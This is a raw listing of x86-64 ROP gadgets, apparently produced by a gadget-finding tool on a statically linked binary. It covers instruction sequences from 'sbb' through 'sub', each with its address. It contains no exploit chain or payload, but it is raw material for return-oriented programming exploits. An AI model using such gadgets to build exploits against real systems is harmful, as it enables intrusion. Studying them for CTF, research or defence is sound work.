0x0000000000494c85 : sbb dh, bl ; ret
0x00000000004b7f88 : sbb dh, cl ; stc ; jmp qword ptr [rax]
0x00000000004b3829 : sbb dh, dh ; call rsp
0x00000000004005c0 : sbb dl, 0 ; test dl, dl ; jne 0x4005d1 ; ret
0x0000000000487497 : sbb dl, dh ; jmp r11
0x000000000048f22b : sbb dword ptr [rax - 0x7d], ecx ; ret
0x0000000000494b79 : sbb dword ptr [rax - 0x7d], ecx ; ret 0x8001
0x0000000000467e79 : sbb dword ptr [rbx - 0x52743], eax ; call qword ptr [rax]
0x00000000004b007d : sbb dword ptr [rbx], edx ; mov ch, 0x99 ; in eax, 0xff ; lahf ; mov dh, 0xc7 ; ret 0xe71f
0x000000000044d017 : sbb eax, -1 ; ret
0x0000000000493cd2 : sbb eax, 0x18c48348 ; ret
0x0000000000496d10 : sbb eax, 0x22d01b ; jne 0x496d00 ; pop rbx ; ret
0x0000000000407235 : sbb eax, 0x31410488 ; ret
0x0000000000465394 : sbb eax, 0x39480001 ; ret
0x00000000004520a2 : sbb eax, 0x39480027 ; ret
0x0000000000464812 : sbb eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x481e
0x000000000040e5da : sbb eax, dword ptr [rax] ; add byte ptr [rbx - 0x7bf0fe02], al ; ret 0x1b
0x000000000048931a : sbb eax, eax ; and eax, 2 ; sub eax, 1 ; ret
0x0000000000432a57 : sbb eax, eax ; or eax, 1 ; ret
0x000000000049485f : sbb eax, eax ; ret
0x000000000044d015 : sbb eax, eax ; sbb eax, -1 ; ret
0x000000000041fcca : sbb ebp, dword ptr [rdx] ; add bl, dh ; ret
0x000000000042afd1 : sbb ebp, dword ptr [rip + 0xf480002] ; ret 0x66c3
0x0000000000405c31 : sbb ebp, eax ; fucomp st(7) ; in eax, 0xc4 ; ret
0x0000000000479629 : sbb ecx, dword ptr [rbp + 0x29] ; ret 0x8948
0x00000000004576de : sbb ecx, dword ptr [rcx + 0x50895048] ; push rsp ; ret
0x000000000040a83d : sbb ecx, dword ptr [rcx - 0x7d] ; ret
0x000000000049b151 : sbb ecx, edi ; call rax
0x000000000049b18d : sbb ecx, edi ; jmp qword ptr [rax]
0x000000000049b159 : sbb edi, ecx ; call qword ptr [rax]
0x0000000000496d11 : sbb edx, eax ; and al, byte ptr [rax] ; jne 0x496cff ; pop rbx ; ret
0x00000000004b38e9 : sbb esi, esi ; jmp qword ptr [rax]
0x0000000000406415 : sbb esp, eax ; ret
0x00000000004520a1 : sbb rax, 0x39480027 ; ret
0x00000000004b38e8 : sbb rsi, rsi ; jmp qword ptr [rax]
0x0000000000431af2 : scasb al, byte ptr [rdi] ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000044658e : scasb al, byte ptr [rdi] ; add eax, 0x83480000 ; ret 0xe910
0x00000000004ab041 : scasb al, byte ptr [rdi] ; cld ; lcall ptr [rdi + rbp*4] ; cld ; jmp qword ptr [rax]
0x00000000004b7cf1 : scasb al, byte ptr [rdi] ; stc ; call qword ptr [rcx]
0x000000000049b49d : scasb al, byte ptr [rdi] ; stc ; inc dword ptr [rax - 0x50] ; stc ; call qword ptr [rax]
0x000000000044668d : scasd eax, dword ptr [rdi] ; add al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00000000004ab045 : scasd eax, dword ptr [rdi] ; cld ; jmp qword ptr [rax]
0x000000000041b27e : scasd eax, dword ptr [rdi] ; nop ; xor eax, eax ; ret
0x0000000000414d69 : scasd eax, dword ptr [rdi] ; ret
0x0000000000461c2e : scasd eax, dword ptr [rdi] ; ret 0x148
0x0000000000418086 : scasd eax, dword ptr [rdi] ; ret 0x2948
0x0000000000420319 : scasd eax, dword ptr [rdi] ; ret 0x8948
0x000000000044ef03 : scasd eax, dword ptr [rdi] ; ret 0xf8e9
0x000000000049b43d : scasd eax, dword ptr [rdi] ; stc ; inc dword ptr [rax] ; mov cl, 0xf9 ; call rax
0x000000000049b41d : scasd eax, dword ptr [rdi] ; stc ; push qword ptr [rax] ; mov cl, 0xf9 ; call qword ptr [rax]
0x000000000045282c : setae al ; ret
0x000000000046195a : sete dh ; mov dword ptr [rbx + 0x40], esi ; xor eax, eax ; pop rbx ; ret
0x0000000000401df7 : setne al ; movzx eax, al ; ret
0x000000000041f2ac : setne al ; neg eax ; ret
0x0000000000454000 : setne dl ; jmp 0x453fe8
0x000000000043233b : shl byte ptr [rax + 0x48], 1 ; clc ; vzeroupper ; ret
0x00000000004322fb : shl byte ptr [rax], 0x48 ; add eax, edi ; vzeroupper ; ret
0x000000000049b174 : shl byte ptr [rbx], 1 ; stc ; push rax ; and al, 0xf9 ; call qword ptr [rax]
0x0000000000496d12 : shl byte ptr [rdx], 1 ; add byte ptr [rbp - 0x1f], dh ; pop rbx ; ret
0x000000000049be70 : shl byte ptr [rip + 0x2550fffa], 1 ; cli ; call rax
0x000000000044d25f : shl byte ptr [rsi + 0x44], 0xf ; out dx, eax ; ret 0xf66
0x000000000044b603 : shl byte ptr [rsi + 0xf], 0xd7 ; ror dword ptr [rcx], cl ; ret 0xe074
0x0000000000446db5 : shl byte ptr [rsi + 0xf], 0xeb ; ret 0xf66
0x000000000043426b : shl byte ptr [rsi + 0xf], 0xef ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x5173
0x0000000000434282 : shl byte ptr [rsi + 0xf], 1 ; out dx, eax ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x3a73
0x0000000000479fa6 : shl byte ptr [rsi + 0xf], 1 ; outsd dx, dword ptr [rsi] ; ret
0x0000000000479fb7 : shl byte ptr [rsi + 0xf], 1 ; outsd dx, dword ptr [rsi] ; ret 0xf66
0x0000000000434161 : shl byte ptr [rsi + 0xf], cl ; out dx, eax ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00000000004a71b0 : shl dword ptr [rax + rax], 0 ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x24
0x000000000046bdd7 : shl dword ptr [rax], 0x2c ; insb byte ptr [rdi], dx ; add byte ptr [rax - 0x39], cl ; ret 0x32c8
0x00000000004aebc8 : shl dword ptr [rdi - 5], 1 ; ret
0x00000000004341e6 : shl dword ptr [rsi + 0xf], -0x11 ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x830f
0x000000000044d0bb : shl dword ptr [rsi + 0xf], -0x26 ; ret
0x0000000000479fa2 : shl dword ptr [rsi + 0xf], -0x29 ; shl byte ptr [rsi + 0xf], 1 ; outsd dx, dword ptr [rsi] ; ret
0x000000000043429d : shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x2373
0x0000000000434286 : shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x3a73
0x000000000043426f : shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x5173
0x0000000000432d2b : shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x830f
0x0000000000434201 : shl dword ptr [rsi + 0xf], 1 ; out dx, eax ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x830f
0x0000000000431c8c : shl dword ptr [rsi + 0xf], 1 ; xlatb ; ret 0xc085
0x00000000004340c1 : shl dword ptr [rsi + 0xf], cl ; out dx, eax ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x830f
0x0000000000454c91 : shl eax, cl ; pop rbp ; pop r12 ; ret
0x0000000000454c8d : shl ecx, 3 ; pop rbx ; shl eax, cl ; pop rbp ; pop r12 ; ret
0x00000000004899ec : shl ecx, cl ; mov qword ptr [rdi - 0x10], r9 ; ret
0x0000000000489977 : shl ecx, cl ; mov qword ptr [rdi - 8], r9 ; ret
0x0000000000489946 : shl ecx, cl ; mov qword ptr [rdi], r9 ; ret
0x0000000000401613 : shl edx, 0x20 ; or rax, rdx ; ret
0x000000000048dd40 : shl edx, 5 ; add rdx, rax ; jmp 0x48dd56
0x00000000004899eb : shl r9, cl ; mov qword ptr [rdi - 0x10], r9 ; ret
0x0000000000489976 : shl r9, cl ; mov qword ptr [rdi - 8], r9 ; ret
0x0000000000489945 : shl r9, cl ; mov qword ptr [rdi], r9 ; ret
0x0000000000401612 : shl rdx, 0x20 ; or rax, rdx ; ret
0x000000000048dd3f : shl rdx, 5 ; add rdx, rax ; jmp 0x48dd57
0x000000000042a103 : shr al, 0x17 ; ret 0xfffe
0x0000000000429f62 : shr al, 0xb8 ; ret
0x000000000049c2e4 : shr bh, 0xfa ; jmp rax
0x000000000049c2b4 : shr bl, 0xfa ; jmp rax
0x000000000042c9bf : shr byte ptr [rcx], 0xc8 ; ret
0x000000000042af6a : shr byte ptr [rcx], cl ; add al, byte ptr [rax] ; cmovne rax, rdx ; ret
0x000000000045e4d8 : shr byte ptr [rcx], cl ; ret
0x00000000004325fb : shr byte ptr [rcx], cl ; rol bl, 1 ; nop ; xor eax, eax ; ret
0x000000000049d710 : shr byte ptr [rdx - 5], cl ; lcall ptr [rsi] ; insb byte ptr [rdi], dx ; sti ; call rdi
0x000000000049be3c : shr byte ptr [rip + 0x2d50fffa], 0xfa ; jmp rax
0x000000000049c250 : shr cl, 1 ; cli ; jmp rax
0x00000000004937b2 : shr cl, 1 ; ret 0xfffe
0x000000000046ee5c : shr cl, cl ; jrcxz 0x46ee68 ; dec dword ptr [rbp - 0x77] ; ret 0x894c
0x00000000004932bf : shr cl, cl ; ret
0x000000000049c28c : shr dl, 0xfa ; call rax
0x000000000049c290 : shr dl, 1 ; cli ; jmp rax
0x00000000004018ba : shr eax, 0x3f ; ret
0x000000000044ebda : shr eax, 0xe ; and eax, 0x3fc00 ; pop rbx ; ret
0x000000000047b06b : shr eax, 2 ; ret
0x000000000047b573 : shr eax, 2 ; vzeroupper ; ret
0x000000000044ec25 : shr eax, 6 ; and eax, 0x3fffc00 ; pop rbx ; ret
0x00000000004257ae : shr ecx, 3 ; rep stosq qword ptr [rdi], rax ; pop rbx ; ret
0x0000000000489afc : shr ecx, cl ; mov qword ptr [rdi + 0x10], r9 ; ret
0x0000000000489a81 : shr ecx, cl ; mov qword ptr [rdi + 8], r9 ; ret
0x0000000000489a50 : shr ecx, cl ; mov qword ptr [rdi], r9 ; ret
0x0000000000489afb : shr r9, cl ; mov qword ptr [rdi + 0x10], r9 ; ret
0x0000000000489a80 : shr r9, cl ; mov qword ptr [rdi + 8], r9 ; ret
0x0000000000489a4f : shr r9, cl ; mov qword ptr [rdi], r9 ; ret
0x00000000004018b9 : shr rax, 0x3f ; ret
0x000000000047b06a : shr rax, 2 ; ret
0x000000000047b572 : shr rax, 2 ; vzeroupper ; ret
0x00000000004a6389 : sldt word ptr [rax] ; ret
0x000000000047a8a6 : stc ; add byte ptr [rax + rax], cl ; add byte ptr [rbx + rax - 0xd], dh ; ret
0x000000000049b46a : stc ; call qword ptr [rax + 0x20fff9b6]
0x000000000049b3ca : stc ; call qword ptr [rax + 0x20fff9b7]
0x000000000049b6b6 : stc ; call qword ptr [rax - 0x1f000639]
0x000000000049b53e : stc ; call qword ptr [rax - 0x1f00065e]
0x000000000049b4ea : stc ; call qword ptr [rax - 0x1f000665]
0x000000000049bbce : stc ; call qword ptr [rax - 0x2f000622]
0x000000000049b15a : stc ; call qword ptr [rax]
0x00000000004b7142 : stc ; call qword ptr [rbx]
0x00000000004b7b5a : stc ; call qword ptr [rcx]
0x000000000049b9d2 : stc ; call qword ptr [rdx]
0x000000000049b4fa : stc ; call rax
0x000000000049b2b6 : stc ; call rcx
0x000000000049b276 : stc ; call rdx
0x000000000049b2d2 : stc ; call rsi
0x000000000049bac2 : stc ; call rsp
0x00000000004bc071 : stc ; cld ; jmp qword ptr [rdx]
0x00000000004bc089 : stc ; cld ; jmp rdx
0x00000000004640de : stc ; dec dword ptr [rax + 0x29] ; ret
0x000000000046f5d5 : stc ; dec dword ptr [rax - 0x39] ; ret 0xffa0
0x000000000049b38e : stc ; dec dword ptr [rax - 0x56] ; stc ; call qword ptr [rax]
0x0000000000463095 : stc ; dec dword ptr [rbp - 0x7b] ; dec dword ptr [rax - 0x77] ; ret
0x000000000049b5aa : stc ; inc dword ptr [rax + 0x10fff9df] ; sar cl, cl ; call rax
0x000000000049b54a : stc ; inc dword ptr [rax + 0x58fff9a6] ; sar cl, cl ; jmp qword ptr [rax]
0x000000000049b20e : stc ; inc dword ptr [rax + 0x5b] ; stc ; push qword ptr [rax] ; pop rsp ; stc ; jmp qword ptr [rax]
0x000000000049b5de : stc ; inc dword ptr [rax - 0x27] ; stc ; jmp qword ptr [rax]
0x000000000049b6b2 : stc ; inc dword ptr [rax - 0x3a] ; stc ; call qword ptr [rax - 0x1f000639]
0x000000000049b40a : stc ; inc dword ptr [rax - 0x49] ; stc ; call rax
0x000000000049b406 : stc ; inc dword ptr [rax - 0x4b] ; stc ; inc dword ptr [rax - 0x49] ; stc ; call rax
0x000000000049b49e : stc ; inc dword ptr [rax - 0x50] ; stc ; call qword ptr [rax]
0x000000000049b436 : stc ; inc dword ptr [rax - 0x53] ; stc ; jmp qword ptr [rax]
0x000000000049b3ae : stc ; inc dword ptr [rax - 0x56] ; stc ; inc dword ptr [rax] ; lodsb al, byte ptr [rsi] ; stc ; jmp rax
0x000000000049b53a : stc ; inc dword ptr [rax - 0x5f] ; stc ; call qword ptr [rax - 0x1f00065e]
0x000000000049b4e6 : stc ; inc dword ptr [rax - 0x66] ; stc ; call qword ptr [rax - 0x1f000665]
0x000000000049b67e : stc ; inc dword ptr [rax] ; fdivr st(1) ; call rax
0x000000000049b3b2 : stc ; inc dword ptr [rax] ; lodsb al, byte ptr [rsi] ; stc ; jmp rax
0x000000000049b456 : stc ; inc dword ptr [rax] ; lodsd eax, dword ptr [rsi] ; stc ; jmp rax
0x000000000049b43e : stc ; inc dword ptr [rax] ; mov cl, 0xf9 ; call rax
0x000000000049b21e : stc ; inc dword ptr [rax] ; pop rdi ; stc ; push rax ; pop rdi ; stc ; jmp rax
0x000000000049b1fa : stc ; inc dword ptr [rax] ; push rsp ; stc ; push qword ptr [rax + 0x55] ; stc ; jmp rax
0x000000000049b556 : stc ; inc dword ptr [rax] ; salc ; stc ; jmp rax
0x000000000049b6a2 : stc ; inc dword ptr [rax] ; sar ecx, -1 ; push rax ; ret 0xfff9
0x000000000049b2b2 : stc ; inc dword ptr [rcx - 0x74] ; stc ; call rcx
0x000000000049b272 : stc ; inc dword ptr [rdx] ; xchg ecx, edi ; call rdx
0x000000000049b2fa : stc ; inc dword ptr [rsi - 0x73] ; stc ; call rsi
0x000000000049b506 : stc ; inc eax ; movsb byte ptr [rdi], byte ptr [rsi] ; stc ; call qword ptr [rax]
0x000000000049b6e6 : stc ; inc eax ; ret 0xfff9
0x000000000049b51a : stc ; inc eax ; xchg eax, esi ; stc ; call qword ptr [rax]
0x000000000049b2ae : stc ; inc ecx ; mov edi, ecx ; inc dword ptr [rcx - 0x74] ; stc ; call rcx
0x0000000000445642 : stc ; je 0x44560e ; lea r10, qword ptr [r10 + r9] ; jmp r10
0x000000000049b1d2 : stc ; jmp qword ptr [rax + 0x10fff945]
0x000000000049b192 : stc ; jmp qword ptr [rax + 0x20fff92d]
0x000000000049b19a : stc ; jmp qword ptr [rax + 0x20fff930]
0x000000000049b1a2 : stc ; jmp qword ptr [rax + 0x20fff933]
0x000000000049b1aa : stc ; jmp qword ptr [rax + 0x20fff936]
0x000000000049b1b2 : stc ; jmp qword ptr [rax + 0x20fff939]
0x000000000049b1ba : stc ; jmp qword ptr [rax + 0x20fff93c]
0x000000000049b1c2 : stc ; jmp qword ptr [rax + 0x20fff93f]
0x000000000049b37e : stc ; jmp qword ptr [rax + 0x30fff98d]
0x000000000049b18e : stc ; jmp qword ptr [rax]
0x00000000004b6e8a : stc ; jmp qword ptr [rbx]
0x000000000049b2c6 : stc ; jmp qword ptr [rcx]
0x000000000049b30e : stc ; jmp qword ptr [rdi]
0x00000000004b7ea6 : stc ; jmp qword ptr [rdx]
0x000000000049b2de : stc ; jmp qword ptr [rsi + 0x26fff989]
0x000000000049b2e6 : stc ; jmp qword ptr [rsi + 0x26fff98a]
0x000000000049b2ee : stc ; jmp qword ptr [rsi + 0x26fff98b]
0x000000000049b30a : stc ; jmp qword ptr [rsi + 0x27fff98f]
0x000000000049b2e2 : stc ; jmp qword ptr [rsi]
0x000000000049b202 : stc ; jmp rax
0x00000000004b7106 : stc ; jmp rbx
0x000000000049bab2 : stc ; jmp rsp
0x00000000004aea44 : stc ; jnp 0x4aea03 ; ret
0x000000000049b54e : stc ; lcall ptr [rax - 0x2e] ; stc ; jmp qword ptr [rax]
0x000000000049b9ce : stc ; ljmp ptr [rbx + rdi*8 - 7] ; call qword ptr [rdx]
0x000000000049bb0a : stc ; ljmp ptr [rdx + 0x3afff9fb] ; sti ; stc ; jmp rax
0x0000000000436b48 : stc ; mov dword ptr [rdi - 4], ecx ; ret
0x000000000044fa23 : stc ; out 0x26, eax ; add byte ptr [rax + 0x39], cl ; ret
0x000000000049b186 : stc ; push qword ptr [rax + 0x29] ; stc ; call qword ptr [rax]
0x000000000049b1fe : stc ; push qword ptr [rax + 0x55] ; stc ; jmp rax
0x000000000049b60e : stc ; push qword ptr [rax - 0x2f] ; stc ; push qword ptr [rax] ; sar ecx, cl ; call qword ptr [rax]
0x000000000049b6e2 : stc ; push qword ptr [rax - 0x3f] ; stc ; inc eax ; ret 0xfff9
0x000000000049b502 : stc ; push qword ptr [rax - 0x5d] ; stc ; inc eax ; movsb byte ptr [rdi], byte ptr [rsi] ; stc ; call qword ptr [rax]
0x000000000049b516 : stc ; push qword ptr [rax - 0x6b] ; stc ; inc eax ; xchg eax, esi ; stc ; call qword ptr [rax]
0x000000000049b38a : stc ; push qword ptr [rax - 0x71] ; stc ; dec dword ptr [rax - 0x56] ; stc ; call qword ptr [rax]
0x000000000049b27e : stc ; push qword ptr [rax - 0x7a] ; stc ; jmp qword ptr [rax]
0x000000000049b41e : stc ; push qword ptr [rax] ; mov cl, 0xf9 ; call qword ptr [rax]
0x000000000049b6d2 : stc ; push qword ptr [rax] ; mov esp, 0xbd80fff9 ; stc ; call rax
0x000000000049b212 : stc ; push qword ptr [rax] ; pop rsp ; stc ; jmp qword ptr [rax]
0x000000000049b6be : stc ; push qword ptr [rax] ; retf 0xfff9 ; or bl, 0xf9 ; call rax
0x000000000049b58e : stc ; push qword ptr [rax] ; sar cl, cl ; push rax ; sar ecx, cl ; call rax
0x000000000049b62e : stc ; push qword ptr [rax] ; sar ecx, 1 ; push rax ; sar cl, cl ; call rax
0x000000000049b612 : stc ; push qword ptr [rax] ; sar ecx, cl ; call qword ptr [rax]
0x000000000049b1ce : stc ; push qword ptr [rax] ; stc ; jmp qword ptr [rax + 0x10fff945]
0x000000000049bb4e : stc ; push qword ptr [rax] ; sti ; stc ; call rax
0x000000000049b5fa : stc ; push qword ptr [rax] ; xlatb ; stc ; call qword ptr [rax]
0x000000000049b176 : stc ; push rax ; and al, 0xf9 ; call qword ptr [rax]
0x000000000049b396 : stc ; push rax ; lodsd eax, dword ptr [rsi] ; stc ; call rax
0x000000000049b222 : stc ; push rax ; pop rdi ; stc ; jmp rax
0x000000000049b61a : stc ; push rax ; salc ; stc ; call rax
0x000000000049b632 : stc ; push rax ; sar cl, cl ; call rax
0x000000000049b592 : stc ; push rax ; sar ecx, cl ; call rax
0x000000000049b156 : stc ; push rax ; sbb edi, ecx ; call qword ptr [rax]
0x000000000049ba92 : stc ; push rsp ; add bh, dl ; push qword ptr [rdx + rax - 6] ; jmp rsp
0x000000000044d789 : stc ; salc ; clc ; ret
0x000000000043f464 : stc ; vmovups zmmword ptr [rdi - 0x200], zmm15 ; ret
0x0000000000432ad7 : stc ; xlatb ; ret 0xff2d
0x00000000004b244a : std ; call qword ptr [rax]
0x00000000004bcf82 : std ; call qword ptr [rbx]
0x00000000004bca12 : std ; call qword ptr [rdx]
0x00000000004b90ea : std ; call rdx
0x00000000004b24ce : std ; call rsp
0x000000000047cf6a : std ; dec dword ptr [rax + 0x39] ; ret
0x000000000047a8c8 : std ; dec dword ptr [rax + 0xf] ; ret 0x90c3
0x0000000000450d2e : std ; dec dword ptr [rax - 0x77] ; ret
0x00000000004705e2 : std ; dec dword ptr [rax - 0x7d] ; clc ; dec dword ptr [rax - 0x77] ; ret
0x000000000042ab02 : std ; dec dword ptr [rbp - 0x7b] ; test byte ptr [rdi], 0x84 ; ret
0x00000000004891ab : std ; inc dword ptr [rbp - 0x76b08a40] ; ret
0x000000000048865e : std ; jbe 0x48866c ; ret
0x00000000004bd4ea : std ; jmp qword ptr [rax]
0x00000000004b1a96 : std ; jmp qword ptr [rbx]
0x00000000004bc75a : std ; jmp qword ptr [rcx]
0x00000000004b8bf2 : std ; jmp qword ptr [rdi]
0x00000000004b8312 : std ; jmp qword ptr [rdx]
0x00000000004ac10a : std ; jmp rax
0x00000000004bc78e : std ; jmp rsp
0x00000000004b1a8e : std ; ljmp ptr [rdi + rbx*4 - 0x60430003] ; std ; jmp qword ptr [rbx]
0x000000000043636b : std ; mov word ptr [rdi - 2], cx ; ret
0x000000000047f73f : std ; or al, 0xf8 ; dec dword ptr [rax - 0x77] ; ret
0x0000000000451d3e : std ; push rbx ; ret
0x00000000004b1aa2 : std ; push rsp ; lahf ; std ; jmp qword ptr [rbx]
0x000000000044d9c3 : std ; rep movsb byte ptr [rdi], byte ptr [rsi] ; cld ; ret
0x000000000049bac1 : std ; stc ; call rsp
0x000000000049b981 : std ; stc ; jmp qword ptr [rax]
0x00000000004323a1 : std ; xlatb ; ret
0x0000000000432399 : std ; xlatb ; ret 0xc085
0x0000000000432913 : std ; xlatb ; ret 0xe883
0x000000000047a1b4 : std ; xlatb ; rol ch, cl ; std ; xlatb ; ret
0x0000000000428691 : sti ; add al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; call qword ptr [rax]
0x0000000000418163 : sti ; add cl, byte ptr [rax + 0xf] ; scasd eax, dword ptr [rdi] ; ret
0x00000000004826f1 : sti ; and eax, dword ptr [rax] ; xor eax, eax ; add rsp, 8 ; ret
0x000000000049d15e : sti ; call qword ptr [rax]
0x000000000049d722 : sti ; call qword ptr [rbx]
0x000000000049c946 : sti ; call qword ptr [rcx - 0x1d0004cb]
0x000000000049c942 : sti ; call qword ptr [rcx - 0x6e0004cb]
0x000000000049c8d2 : sti ; call qword ptr [rdi]
0x000000000049d166 : sti ; call rax
0x000000000049d716 : sti ; call rdi
0x000000000049d70e : sti ; call rdx
0x000000000044fb4f : sti ; dec dword ptr [rax - 0x77] ; ret
0x0000000000467a21 : sti ; imul esp, dword ptr [rip + 0x48b4800], -8 ; jmp rax
0x000000000049d71a : sti ; inc dword ptr [rcx + 0x28fffb6a] ; push -5 ; call qword ptr [rbx]
0x00000000004ba5a2 : sti ; jmp qword ptr [rax]
0x00000000004ba3aa : sti ; jmp qword ptr [rbx]
0x000000000049d706 : sti ; jmp qword ptr [rdx]
0x00000000004971e0 : sti ; jmp qword ptr [rsi + 0xf]
0x000000000049c3da : sti ; jmp rax
0x000000000049c94a : sti ; jmp rdx
0x000000000049c41e : sti ; jmp rsi
0x000000000049d712 : sti ; lcall ptr [rsi] ; insb byte ptr [rdi], dx ; sti ; call rdi
0x000000000049d71e : sti ; ljmp ptr [rax] ; push -5 ; call qword ptr [rbx]
0x000000000049d70a : sti ; ljmp ptr [rax] ; push -5 ; call rdx
0x000000000049d702 : sti ; ljmp ptr [rdx + 0x6b] ; sti ; jmp qword ptr [rdx]
0x0000000000436748 : sti ; mov dword ptr [rdi - 4], ecx ; ret
0x000000000049d15a : sti ; push qword ptr [rdx - 5] ; call qword ptr [rax]
0x000000000049d18a : sti ; push qword ptr [rdx - 5] ; jmp rax
0x000000000049d156 : sti ; push qword ptr [rdx - 5] ; push qword ptr [rdx - 5] ; call qword ptr [rax]
0x000000000049d186 : sti ; push qword ptr [rdx - 5] ; push qword ptr [rdx - 5] ; jmp rax
0x000000000049c97e : sti ; push qword ptr [rdx] ; sti ; jmp rdx
0x000000000049d162 : sti ; push rax ; sti ; call rax
0x00000000004aebca : sti ; ret
0x0000000000403499 : sti ; sal byte ptr [rbp - 0x164a245b], 0x5b ; ret 0x3956
0x000000000049b9d1 : sti ; stc ; call qword ptr [rdx]
0x000000000049bb51 : sti ; stc ; call rax
0x000000000049bb11 : sti ; stc ; jmp rax
0x000000000049b9cd : sti ; stc ; ljmp ptr [rbx + rdi*8 - 7] ; call qword ptr [rdx]
0x000000000049bb4d : sti ; stc ; push qword ptr [rax] ; sti ; stc ; call rax
0x00000000004611c7 : sti ; test rax, rax ; je 0x4611d5 ; call rax
0x00000000004af0a4 : stosb byte ptr [rdi], al ; cli ; ret 0xac65
0x000000000044e6eb : stosb byte ptr [rdi], al ; mov rax, rdx ; ret
0x0000000000407bbe : stosb byte ptr [rdi], al ; ret 0x2b
0x000000000049b391 : stosb byte ptr [rdi], al ; stc ; call qword ptr [rax]
0x000000000049b3b1 : stosb byte ptr [rdi], al ; stc ; inc dword ptr [rax] ; lodsb al, byte ptr [rsi] ; stc ; jmp rax
0x000000000049b4b5 : stosb byte ptr [rdi], al ; stc ; jmp qword ptr [rax]
0x000000000049b3d1 : stosb byte ptr [rdi], al ; stc ; jmp rax
0x000000000042ae81 : stosd dword ptr [rdi], eax ; and dword ptr [rdx], eax ; add byte ptr [rax + 0xf], cl ; ret 0x66c3
0x00000000004b6d21 : stosd dword ptr [rdi], eax ; clc ; call qword ptr [rax]
0x000000000046f29e : stosd dword ptr [rdi], eax ; mov eax, 1 ; ret
0x00000000004257b3 : stosd dword ptr [rdi], eax ; pop rbx ; ret
0x00000000004034af : stosd dword ptr [rdi], eax ; pop rbx ; ret 0x3956
0x00000000004b01ac : stosd dword ptr [rdi], eax ; ret
0x00000000004b7b59 : stosd dword ptr [rdi], eax ; stc ; call qword ptr [rcx]
0x000000000049b435 : stosd dword ptr [rdi], eax ; stc ; inc dword ptr [rax - 0x53] ; stc ; jmp qword ptr [rax]
0x000000000049b455 : stosd dword ptr [rdi], eax ; stc ; inc dword ptr [rax] ; lodsd eax, dword ptr [rsi] ; stc ; jmp rax
0x000000000042b131 : stosd dword ptr [rdi], eax ; sub eax, dword ptr [rdx] ; add byte ptr [rax + 0xf], cl ; ret 0x66c3
0x00000000004257b2 : stosq qword ptr [rdi], rax ; pop rbx ; ret
0x00000000004b0591 : sub ah, ah ; mov bh, 6 ; movsd dword ptr [rdi], dword ptr [rsi] ; int1 ; ret 0x5803
0x0000000000400b4a : sub al, 0 ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401b74 : sub al, 0 ; test eax, eax ; je 0x401b87 ; ret
0x0000000000488956 : sub al, 0x48 ; add esp, 0x38 ; ret
0x000000000046bdd9 : sub al, 0x6c ; add byte ptr [rax - 0x39], cl ; ret 0x32c8
0x00000000004668e6 : sub al, 0x6c ; add byte ptr [rax - 0x77], cl ; ret 0x8148
0x000000000044e922 : sub al, 0x72 ; add cl, byte ptr [rax + 0x77f8c50f] ; ret
0x00000000004338b3 : sub al, 0xa ; add byte ptr [rax], al ; xor eax, eax ; ret
0x000000000049b191 : sub al, 0xf9 ; jmp qword ptr [rax + 0x20fff92d]
0x000000000049bccd : sub al, 0xfa ; jmp rdx
0x000000000041f22f : sub al, byte ptr [r8] ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x000000000041f230 : sub al, byte ptr [rax] ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x00000000004b545d : sub al, byte ptr [rax] ; add byte ptr [rax], dl ; test al, 0xf6 ; call qword ptr [rsi]
0x0000000000419375 : sub al, byte ptr [rax] ; add byte ptr [rdx + rax - 0xd], dh ; ret
0x000000000041f1c6 : sub al, byte ptr [rax] ; add dword ptr [rip + 0x2a4b85], 1 ; ret
0x000000000041f135 : sub al, byte ptr [rax] ; ret
0x000000000042af2a : sub al, byte ptr [rdx] ; add bh, dh ; ret 0
0x000000000042b272 : sub al, byte ptr [rdx] ; add byte ptr [rax + 0xf], cl ; ret 0x66c3
0x0000000000432c75 : sub al, ch ; std ; xlatb ; ret
0x00000000004bc759 : sub bh, ch ; jmp qword ptr [rcx]
0x00000000004bc78d : sub bh, ch ; jmp rsp
0x000000000049c3d9 : sub bl, bh ; jmp rax
0x000000000049c41d : sub bl, bh ; jmp rsi
0x000000000046a27b : sub bl, cl ; in eax, 0xdf ; loopne 0x46a210 ; ret
0x0000000000407538 : sub bl, dh ; ret
0x000000000047de87 : sub byte ptr [rax + 0x39], cl ; ret 0x870f
0x000000000047de86 : sub byte ptr [rax + 0x39], r9b ; ret 0x870f
0x000000000048a4e3 : sub byte ptr [rax + 1], cl ; ret 0x1474
0x0000000000429364 : sub byte ptr [rax - 0x77], cl ; out dx, eax ; call rax
0x0000000000492dbc : sub byte ptr [rax - 0x77], cl ; ret
0x0000000000476644 : sub byte ptr [rax - 0x77], cl ; ret 0xc148
0x000000000040b383 : sub byte ptr [rax - 0x7d], cl ; ret
0x000000000048ae7d : sub byte ptr [rax], al ; add byte ptr [rax], al ; jne 0x48aec5 ; leave ; ret
0x00000000004b9224 : sub byte ptr [rax], ch ; add byte ptr [rax], bh ; movsb byte ptr [rdi], byte ptr [rsi] ; cli ; call qword ptr [rax]
0x00000000004b8724 : sub byte ptr [rbp], bl ; add byte ptr [rax], bl ; adc al, 0xfa ; call qword ptr [rdi]
0x000000000044f6e4 : sub byte ptr [rbx + 0x5d], bl ; pop r12 ; pop r13 ; ret
